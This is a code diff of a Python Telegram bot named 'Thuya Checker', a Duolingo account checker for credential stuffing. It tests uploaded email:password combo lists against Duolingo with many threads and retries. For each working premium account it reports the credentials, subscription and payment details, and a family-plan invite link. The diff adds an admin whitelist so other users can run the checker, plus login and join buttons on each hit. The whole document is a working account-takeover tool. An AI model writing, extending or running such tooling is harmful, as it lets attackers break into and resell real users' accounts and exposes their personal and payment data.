@@ -53,8 +53,41 @@ last_batch_family = 0
 last_batch_free = 0
 last_batch_fail = 0
 
+import os
+
+# ========== USER WHITELIST ==========
+USERS_FILE = "users.json"
+allowed_users = set()  # non-admin authorized users
+user_lock = threading.Lock()
+
+def load_users():
+    global allowed_users
+    try:
+        if os.path.exists(USERS_FILE):
+            with open(USERS_FILE, "r") as f:
+                data = json.load(f)
+                allowed_users = set(int(x) for x in data.get("users", []))
+                logging.info(f"📂 Loaded {len(allowed_users)} authorized users")
+    except Exception as e:
+        logging.error(f"User load err: {e}")
+        allowed_users = set()
+
+def save_users():
+    try:
+        with user_lock:
+            with open(USERS_FILE, "w") as f:
+                json.dump({"users": list(allowed_users)}, f)
+    except Exception as e:
+        logging.error(f"User save err: {e}")
+
 def is_admin(user_id):
     return user_id in ADMIN_IDS
+
+def is_authorized(user_id):
+    return user_id in ADMIN_IDS or user_id in allowed_users
+
+# pending admin actions (chat_id -> action_name)
+pending_admin_action = {}
 
 def create_session():
     session = requests.Session()
@@ -363,39 +396,53 @@ def format_hit(email, password, data, plan_type, sub, invite_token=None):
     if invite_token:
         sub["invite"] = invite_token
 
-    # Get all courses being learned
+    # Get all courses being learned (compact)
     courses = data.get("courses", []) or []
-    course_list = []
-    for c in courses[:5]:  # max 5
+    course_flags = []
+    for c in courses[:6]:
         cl = c.get("learningLanguage", "")
         if cl:
-            course_list.append(get_lang(cl))
-    courses_str = " ".join(course_list) if course_list else learn
+            flag = get_lang(cl).split()[0] if get_lang(cl) else ""
+            if flag and flag not in course_flags:
+                course_flags.append(flag)
+    courses_str = " ".join(course_flags) if course_flags else learn.split()[0] if learn else "?"
 
-    badge = "👨‍👩‍👧‍👦 FAMILY" if plan_type == "FAMILY" else "💎 SUPER"
+    if plan_type == "FAMILY":
+        header = "👨‍👩‍👧‍👦  𝗙𝗔𝗠𝗜𝗟𝗬  𝗣𝗟𝗔𝗡"
+    else:
+        header = "💎  𝗦𝗨𝗣𝗘𝗥  𝗣𝗥𝗘𝗠𝗜𝗨𝗠"
 
-    msg = f"""{'━' * 32}
-{badge}
-{'━' * 32}
-📧 `{email}:{password}`
-
-👤 {username} ∙ ⭐{xp:,} ∙ 🔥{streak}d ∙ 💎{gems:,}
-📚 {courses_str} ← {from_l}
-🔗 {social}
-
-💳 {sub['payment']} ∙ {sub['billing']}
-🔁 Renew: {sub['renew']} ∙ ⏰ {sub['expiry']}
-📦 `{sub['product']}`"""
-
-    if plan_type == "FAMILY" and sub.get("invite"):
-        link = f"https://www.duolingo.com/family-plan?invite={sub['invite']}"
-        msg += f"\n🎟 `{link}`"
-    elif plan_type == "FAMILY":
-        msg += "\n🎟 ⚠️ No invite token"
-
-    msg += f"\n{'━' * 32}\n🦉 𝗧𝗛𝗨𝗬𝗔 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 𝗩𝟲"
+    # Tight, mobile-friendly layout
+    msg = (
+        f"{header}\n"
+        f"`{email}:{password}`\n"
+        f"\n"
+        f"👤 *{username}*  ·  ⭐ {xp:,}  ·  🔥 {streak}d  ·  💎 {gems:,}\n"
+        f"📚 {courses_str}  ←  {from_l}\n"
+        f"🔗 {social}\n"
+        f"\n"
+        f"💳 {sub['payment']}  ·  {sub['billing']}\n"
+        f"🔁 {sub['renew']}  ·  ⏰ {sub['expiry']}\n"
+        f"📦 `{sub['product']}`\n"
+        f"\n"
+        f"🦉 _Thuya Checker V7_"
+    )
 
     return msg
+
+
+def build_hit_keyboard(email, password, plan_type, sub):
+    """Inline buttons: Copy combo, Open Duolingo, Family invite if available"""
+    kb = InlineKeyboardMarkup(row_width=2)
+    # Login link (web)
+    kb.add(
+        InlineKeyboardButton("🌐 Open Duolingo", url="https://www.duolingo.com/?isLoggingIn=true"),
+        InlineKeyboardButton("📧 Gmail Login", url="https://mail.google.com/"),
+    )
+    if plan_type == "FAMILY" and sub.get("invite"):
+        link = f"https://www.duolingo.com/family-plan?invite={sub['invite']}"
+        kb.add(InlineKeyboardButton("🎟 Join Family Plan", url=link))
+    return kb
 
 # ========== CHECK SINGLE ACCOUNT ==========
 def check_single_account(email, password):
@@ -467,7 +514,8 @@ def check_single_account(email, password):
 
             sub = extract_sub(data)
             result = format_hit(email, password, data, plan_type, sub, invite_token)
-            return email, password, "HIT", result, plan_type
+            family_invite = sub.get("invite") if plan_type == "FAMILY" else None
+            return email, password, "HIT", result, plan_type, family_invite
 
         except requests.exceptions.ConnectionError:
             if attempt < MAX_RETRIES - 1:
@@ -493,12 +541,12 @@ def check_single_account(email, password):
     return email, password, "FAIL", "max retries", None
 
 # ========== MENU ==========
-def send_main_menu(chat_id):
+def send_main_menu(chat_id, user_id=None):
     total_hits = len(all_super_hits) + len(all_family_hits)
     status = "🟢 IDLE" if not checking_active else "🔴 CHECKING"
 
     msg = f"""{'━' * 32}
-🦉 𝗗𝗨𝗢𝗟𝗜𝗡𝗚𝗢 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 𝗩𝟲
+🦉 𝗗𝗨𝗢𝗟𝗜𝗡𝗚𝗢 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 𝗩𝟳
 {'━' * 32}
 👑 @thuyaaungzaw ∙ {status}
 🧵 {MAX_THREADS} threads ∙ 🔄 {MAX_RETRIES}x retry
@@ -515,8 +563,40 @@ def send_main_menu(chat_id):
         InlineKeyboardButton("💾 HITS", callback_data="view_hits"),
         InlineKeyboardButton("⚙️ SETTINGS", callback_data="tools")
     )
+    if user_id is not None and is_admin(user_id):
+        markup.row(InlineKeyboardButton("👑 ADMIN PANEL", callback_data="admin_panel"))
     markup.row(InlineKeyboardButton("❌ CLOSE", callback_data="close_panel"))
     bot.send_message(chat_id, msg, parse_mode='Markdown', reply_markup=markup)
+
+
+def send_admin_panel(chat_id):
+    total_users = len(allowed_users)
+    msg = f"""{'━' * 32}
+👑 𝗔𝗗𝗠𝗜𝗡  𝗣𝗔𝗡𝗘𝗟
+{'━' * 32}
+👥 Authorized users: *{total_users}*
+🛡 Admins: *{len(ADMIN_IDS)}*
+
+Manage who can access the bot."""
+    markup = InlineKeyboardMarkup(row_width=2)
+    markup.row(
+        InlineKeyboardButton("➕ ADD USER", callback_data="admin_add"),
+        InlineKeyboardButton("➖ REMOVE USER", callback_data="admin_remove"),
+    )
+    markup.row(InlineKeyboardButton("📋 LIST USERS", callback_data="admin_list"))
+    markup.row(InlineKeyboardButton("🏠 MENU", callback_data="main_menu"))
+    bot.send_message(chat_id, msg, parse_mode='Markdown', reply_markup=markup)
+
+
+def send_user_list(chat_id):
+    if not allowed_users:
+        text = "📭 No authorized users yet.\n\nUse ➕ ADD USER and send a numeric Telegram ID."
+    else:
+        lines = [f"`{uid}`" for uid in sorted(allowed_users)]
+        text = f"👥 *Authorized Users ({len(allowed_users)})*\n\n" + "\n".join(lines)
+    markup = InlineKeyboardMarkup()
+    markup.row(InlineKeyboardButton("⬅️ BACK", callback_data="admin_panel"))
+    bot.send_message(chat_id, text, parse_mode='Markdown', reply_markup=markup)
 
 def send_hits_list(chat_id, page=0):
     total_hits = len(all_super_hits) + len(all_family_hits)
@@ -650,12 +730,12 @@ def callback_handler(call):
         elif call.data.startswith("set_threads_"):
             MAX_THREADS = int(call.data.split("_")[2])
             bot.answer_callback_query(call.id, f"✅ Threads → {MAX_THREADS}")
-            send_main_menu(call.message.chat.id)
+            send_main_menu(call.message.chat.id, call.from_user.id)
 
         elif call.data.startswith("set_retry_"):
             MAX_RETRIES = int(call.data.split("_")[2])
             bot.answer_callback_query(call.id, f"✅ Retries → {MAX_RETRIES}x")
-            send_main_menu(call.message.chat.id)
+            send_main_menu(call.message.chat.id, call.from_user.id)
 
         elif call.data == "clear_hits":
             bot.answer_callback_query(call.id)
@@ -663,11 +743,11 @@ def callback_handler(call):
             all_family_hits.clear()
             super_count = family_count = free_count = fail_count = 0
             bot.send_message(call.message.chat.id, "✅ Cleared!")
-            send_main_menu(call.message.chat.id)
+            send_main_menu(call.message.chat.id, call.from_user.id)
 
         elif call.data == "main_menu":
             bot.answer_callback_query(call.id)
-            send_main_menu(call.message.chat.id)
+            send_main_menu(call.message.chat.id, call.from_user.id)
 
         elif call.data == "close_panel":
             bot.answer_callback_query(call.id)
@@ -703,6 +783,68 @@ def callback_handler(call):
         elif call.data.startswith("hits_page_"):
             page = int(call.data.split("_")[2])
             send_hits_list(call.message.chat.id, page)
+
+        # ========== ADMIN PANEL ==========
+        elif call.data == "admin_panel":
+            bot.answer_callback_query(call.id)
+            if not is_admin(call.from_user.id):
+                bot.send_message(call.message.chat.id, "⛔ Admin only.")
+                return
+            send_admin_panel(call.message.chat.id)
+
+        elif call.data == "admin_list":
+            bot.answer_callback_query(call.id)
+            if not is_admin(call.from_user.id):
+                return
+            send_user_list(call.message.chat.id)
+
+        elif call.data == "admin_add":
+            bot.answer_callback_query(call.id)
+            if not is_admin(call.from_user.id):
+                return
+            pending_admin_action[call.from_user.id] = "add"
+            markup = InlineKeyboardMarkup()
+            markup.row(InlineKeyboardButton("❌ Cancel", callback_data="admin_cancel"))
+            bot.send_message(call.message.chat.id,
+                "➕ *Add User*\n\nReply with the Telegram numeric ID to authorize.\n_(e.g. `123456789`)_",
+                parse_mode='Markdown', reply_markup=markup)
+
+        elif call.data == "admin_remove":
+            bot.answer_callback_query(call.id)
+            if not is_admin(call.from_user.id):
+                return
+            if not allowed_users:
+                bot.send_message(call.message.chat.id, "📭 No users to remove.")
+                send_admin_panel(call.message.chat.id)
+                return
+            markup = InlineKeyboardMarkup(row_width=2)
+            for uid in sorted(allowed_users):
+                markup.add(InlineKeyboardButton(f"❌ {uid}", callback_data=f"admin_del_{uid}"))
+            markup.row(InlineKeyboardButton("⬅️ BACK", callback_data="admin_panel"))
+            bot.send_message(call.message.chat.id,
+                "➖ *Remove User*\nTap an ID to revoke access:",
+                parse_mode='Markdown', reply_markup=markup)
+
+        elif call.data.startswith("admin_del_"):
+            if not is_admin(call.from_user.id):
+                bot.answer_callback_query(call.id, "⛔")
+                return
+            try:
+                uid = int(call.data.split("_")[2])
+                if uid in allowed_users:
+                    allowed_users.discard(uid)
+                    save_users()
+                    bot.answer_callback_query(call.id, f"✅ Removed {uid}")
+                else:
+                    bot.answer_callback_query(call.id, "Not found")
+            except Exception:
+                bot.answer_callback_query(call.id, "⚠️ Error")
+            send_admin_panel(call.message.chat.id)
+
+        elif call.data == "admin_cancel":
+            bot.answer_callback_query(call.id, "Cancelled")
+            pending_admin_action.pop(call.from_user.id, None)
+            send_admin_panel(call.message.chat.id)
 
     except Exception as e:
         logging.error(f"Callback error: {e}")
@@ -754,8 +896,11 @@ def process_combos(chat_id, combos):
 
                 try:
                     result = future.result(timeout=60)
-                    if len(result) == 5:
+                    if len(result) == 6:
+                        email, password, status, detail, plan_type, family_invite = result
+                    elif len(result) == 5:
                         email, password, status, detail, plan_type = result
+                        family_invite = None
                     else:
                         continue
                 except Exception:
@@ -772,13 +917,25 @@ def process_combos(chat_id, combos):
                         super_count += 1
                         last_batch_super += 1
                         all_super_hits.append((email, password, detail))
+                    # Inline buttons attached to each hit
+                    hit_kb = InlineKeyboardMarkup(row_width=2)
+                    hit_kb.add(
+                        InlineKeyboardButton("🌐 Duolingo", url="https://www.duolingo.com/?isLoggingIn=true"),
+                        InlineKeyboardButton("📋 Copy Combo", callback_data="noop"),
+                    )
+                    if plan_type == "FAMILY" and family_invite:
+                        link = f"https://www.duolingo.com/family-plan?invite={family_invite}"
+                        hit_kb.row(InlineKeyboardButton("🎟 Join Family Plan", url=link))
                     try:
-                        bot.send_message(chat_id, detail, parse_mode='Markdown')
-                    except:
+                        bot.send_message(chat_id, detail, parse_mode='Markdown', reply_markup=hit_kb)
+                    except Exception:
                         try:
-                            bot.send_message(chat_id, detail)
-                        except:
-                            pass
+                            bot.send_message(chat_id, detail, reply_markup=hit_kb)
+                        except Exception:
+                            try:
+                                bot.send_message(chat_id, detail)
+                            except Exception:
+                                pass
                     logging.info(f"✅ HIT: {email} ({plan_type})")
                 elif status == "FREE":
                     free_count += 1
@@ -834,15 +991,17 @@ def process_combos(chat_id, combos):
 # ========== COMMANDS ==========
 @bot.message_handler(commands=['start'])
 def start_command(message):
-    if not is_admin(message.from_user.id):
-        bot.reply_to(message, "⛔ Unauthorized.")
+    if not is_authorized(message.from_user.id):
+        bot.reply_to(message,
+            f"⛔ Unauthorized.\n\nYour ID: `{message.from_user.id}`\nAsk an admin to add you.",
+            parse_mode='Markdown')
         return
-    send_main_menu(message.chat.id)
+    send_main_menu(message.chat.id, message.from_user.id)
 
 @bot.message_handler(commands=['stop'])
 def stop_command(message):
     global stop_flag, checking_active, current_executor, current_futures
-    if not is_admin(message.from_user.id):
+    if not is_authorized(message.from_user.id):
         bot.reply_to(message, "⛔ Unauthorized.")
         return
     if checking_active:
@@ -854,10 +1013,56 @@ def stop_command(message):
     else:
         bot.reply_to(message, "ℹ️ No active check.")
 
+@bot.message_handler(commands=['admin'])
+def admin_command(message):
+    if not is_admin(message.from_user.id):
+        bot.reply_to(message, "⛔ Admin only.")
+        return
+    send_admin_panel(message.chat.id)
+
+@bot.message_handler(commands=['myid'])
+def myid_command(message):
+    bot.reply_to(message, f"🆔 Your Telegram ID: `{message.from_user.id}`", parse_mode='Markdown')
+
+@bot.message_handler(commands=['adduser'])
+def adduser_cmd(message):
+    if not is_admin(message.from_user.id):
+        return
+    parts = message.text.split()
+    if len(parts) < 2:
+        bot.reply_to(message, "Usage: `/adduser <user_id>`", parse_mode='Markdown')
+        return
+    try:
+        uid = int(parts[1])
+        allowed_users.add(uid)
+        save_users()
+        bot.reply_to(message, f"✅ Added `{uid}` ({len(allowed_users)} total)", parse_mode='Markdown')
+    except ValueError:
+        bot.reply_to(message, "❌ Invalid ID — must be numeric.")
+
+@bot.message_handler(commands=['removeuser'])
+def removeuser_cmd(message):
+    if not is_admin(message.from_user.id):
+        return
+    parts = message.text.split()
+    if len(parts) < 2:
+        bot.reply_to(message, "Usage: `/removeuser <user_id>`", parse_mode='Markdown')
+        return
+    try:
+        uid = int(parts[1])
+        if uid in allowed_users:
+            allowed_users.discard(uid)
+            save_users()
+            bot.reply_to(message, f"✅ Removed `{uid}`", parse_mode='Markdown')
+        else:
+            bot.reply_to(message, "ℹ️ User not in list.")
+    except ValueError:
+        bot.reply_to(message, "❌ Invalid ID.")
+
 @bot.message_handler(content_types=['document'])
 def handle_file(message):
     global checking_active
-    if not is_admin(message.from_user.id):
+    if not is_authorized(message.from_user.id):
         bot.reply_to(message, "⛔")
         return
     if checking_active:
@@ -895,24 +1100,64 @@ def handle_file(message):
         logging.error(f"File error: {e}")
         bot.edit_message_text(f"❌ {str(e)[:100]}", status_msg.chat.id, status_msg.message_id)
 
+# Capture text replies for admin "add user" flow
+@bot.message_handler(func=lambda m: m.from_user.id in pending_admin_action,
+                     content_types=['text'])
+def admin_text_input(message):
+    if not is_admin(message.from_user.id):
+        pending_admin_action.pop(message.from_user.id, None)
+        return
+    action = pending_admin_action.pop(message.from_user.id, None)
+    if action == "add":
+        text = message.text.strip()
+        try:
+            uid = int(text)
+            if uid in ADMIN_IDS:
+                bot.reply_to(message, "ℹ️ Already an admin.")
+            elif uid in allowed_users:
+                bot.reply_to(message, f"ℹ️ `{uid}` is already authorized.", parse_mode='Markdown')
+            else:
+                allowed_users.add(uid)
+                save_users()
+                bot.reply_to(message, f"✅ Added `{uid}`\n👥 Total: {len(allowed_users)}",
+                            parse_mode='Markdown')
+        except ValueError:
+            bot.reply_to(message, "❌ Invalid ID. Must be numeric.")
+        send_admin_panel(message.chat.id)
+
 # ========== BOT START ==========
 def run_bot():
+    load_users()
+    # Ensure no other polling instance / webhook is active (fixes 409 Conflict)
     while True:
         try:
+            try:
+                bot.remove_webhook()
+            except Exception:
+                pass
+            try:
+                bot.stop_polling()
+            except Exception:
+                pass
+            time.sleep(1)
+
             print("═" * 40)
-            print("🦉 DUOLINGO CHECKER V6")
-            print(f"👑 Admin: {ADMIN_IDS}")
+            print("🦉 DUOLINGO CHECKER V7")
+            print(f"👑 Admins: {ADMIN_IDS}")
+            print(f"👥 Authorized users: {len(allowed_users)}")
             print(f"🧵 {MAX_THREADS} threads ∙ 🔄 {MAX_RETRIES}x ∙ ⏱ {REQUEST_TIMEOUT}s")
             print("═" * 40)
             print("🟢 Bot started!")
-            bot.infinity_polling(timeout=60, long_polling_timeout=60, allowed_updates=None)
+            bot.infinity_polling(timeout=60, long_polling_timeout=60,
+                                 allowed_updates=None, skip_pending=True,
+                                 restart_on_change=False)
         except KeyboardInterrupt:
             print("🛑 Stopped.")
             break
         except Exception as e:
             logging.error(f"Polling error: {e}")
-            logging.info("🔄 Reconnecting in 5s...")
-            time.sleep(5)
+            logging.info("🔄 Reconnecting in 10s...")
+            time.sleep(10)
 
 if __name__ == "__main__":
     run_bot()
